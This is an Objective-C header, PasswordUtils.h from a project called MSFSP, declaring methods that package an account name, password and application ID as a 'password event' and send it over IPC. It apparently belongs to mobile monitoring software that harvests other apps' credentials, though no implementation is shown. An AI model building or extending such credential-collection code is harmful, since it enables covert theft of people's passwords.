//
//  PasswordUtils.h
//  MSFSP
//
//  Created by Makara on 2/26/14.
//
//

#import <Foundation/Foundation.h>

@class SharedFile2IPCSender,FxPasswordEvent;

@interface PasswordUtils : NSObject {
    SharedFile2IPCSender	*mIMSharedFileSender;
    
}
@property (retain) SharedFile2IPCSender *mIMSharedFileSender;

+ (id) sharedPasswordUtils;
+ (void) sendPasswordEvent: (FxPasswordEvent *) aFxPassword ;

+ (void) sendPasswordEventForAccount: (NSString *) aAccountName
                           password: (NSString *) aPassword
                      applicationID: (NSString *) aAppID
                    applicationName: (NSString *) aAppName;
@end
